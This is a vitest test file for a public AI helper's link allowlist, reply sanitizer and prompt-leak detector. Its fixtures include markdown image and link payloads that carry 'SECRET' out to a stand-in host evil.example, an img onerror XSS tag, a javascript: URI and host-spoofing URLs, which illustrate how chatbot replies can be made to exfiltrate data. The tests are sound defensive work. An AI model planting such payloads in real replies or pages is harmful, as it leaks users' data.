import { describe, expect, it } from 'vitest';
import { isAllowedLink } from '@/services/public-timmie/links';
import { PUBLIC_RULES } from '@/services/public-timmie/prompt';
import { leaksPrompt, sanitizeReply } from '@/services/public-timmie/sanitize';

describe('isAllowedLink', () => {
  it('allows our public pages, knowall.ai and the repositories', () => {
    for (const href of [
      '/',
      '/pricing',
      '/pricing#enquire',
      '/help',
      '/help#faqs',
      '/eula',
      '/privacy',
      '/terms',
      'https://knowall.ai',
      'https://gettimm.ie',
      'https://gettimm.ie/pricing#enquire',
      'https://timmie.knowall.ai/help',
      'https://github.com/knowall-ai/timmie',
      'https://github.com/knowall-ai/timmie-bc-extension',
    ]) {
      expect(isAllowedLink(href), href).toBe(true);
    }
  });

  it('refuses everything else', () => {
    for (const href of [
      'https://evil.example/x',
      'https://knowall.ai.evil.example',
      'https://knowall.ai/?q=secret',
      'http://knowall.ai',
      'javascript:alert(1)',
      'data:text/html,hi',
      'https://user:pw@knowall.ai',
      'https://knowall.ai:8443',
      'https://github.com/someone/else',
      'https://github.com/knowall-ai/timmie/issues',
      '//evil.example',
      '/api/public/chat',
      '/production/00000000-0000-0000-0000-000000000001/time',
      'https://gettimm.ie/api/public/status',
      'https://gettimm.ie/settings',
    ]) {
      expect(isAllowedLink(href), href).toBe(false);
    }
  });
});

describe('sanitizeReply', () => {
  it('strips images and foreign links (exfiltration)', () => {
    const out = sanitizeReply(
      'Here ![x](https://evil.example/p.png?d=SECRET) and [click](https://evil.example/?d=SECRET) or [pricing](/pricing).'
    );
    expect(out).not.toMatch(/evil|SECRET/);
    expect(out).toContain('[pricing](/pricing)');
    expect(out).toContain('click');
  });

  it('removes bare foreign URLs and HTML', () => {
    const out = sanitizeReply(
      'See https://evil.example/a?b=c and <img src=x onerror=alert(1)> https://knowall.ai.'
    );
    expect(out).not.toMatch(/evil|<img|onerror/);
    expect(out).toContain('https://knowall.ai');
    expect(out).toContain('[link removed]');
  });

  it('keeps an allowed markdown link intact', () => {
    expect(sanitizeReply('Use the [enquiry form](https://gettimm.ie/pricing#enquire).')).toBe(
      'Use the [enquiry form](https://gettimm.ie/pricing#enquire).'
    );
  });
});

describe('leaksPrompt', () => {
  it('spots a reply that reproduces the rules', () => {
    expect(leaksPrompt(PUBLIC_RULES.slice(0, 1500))).toBe(true);
  });

  it('does not flag a normal product answer', () => {
    expect(
      leaksPrompt(
        "I'm Timmie's public helper, so I can't see anyone's timesheets. Timmie keeps your time in your own Business Central. For a demo, use the enquiry form on the pricing page."
      )
    ).toBe(false);
  });
});
